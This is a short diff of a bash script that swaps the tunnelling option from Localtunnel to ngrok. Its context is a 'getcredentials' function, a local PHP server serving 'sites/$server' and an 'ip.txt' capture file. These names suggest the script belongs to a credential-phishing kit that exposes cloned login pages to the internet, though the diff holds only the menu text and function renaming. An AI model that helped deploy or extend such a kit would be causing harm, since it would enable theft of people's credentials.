@@ -347,14 +347,14 @@ getcredentials
 }
 start() {
 printf "\n"
-printf "1.Localtunnel\n"
+printf "1.ngrok\n"
 echo ""
 read -p $'\n\e[1;92m\e[0m\e[1;77m\e[0m\e[1;92m ┌─[ Choose the tunneling method:]─[~]
  └──╼ ~ ' host
  
 if [[ $host == 1 ]]; then
 sleep 1
-start_localtunnel
+start_ngrok
 fi
 }
 
@@ -362,7 +362,7 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
 cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
 sleep 2
 
-start_localtunnel()  {
+start_ngrok()  {
 if [[ -e sites/$server/ip.txt ]]; then
 rm -rf sites/$server/ip.txt
 
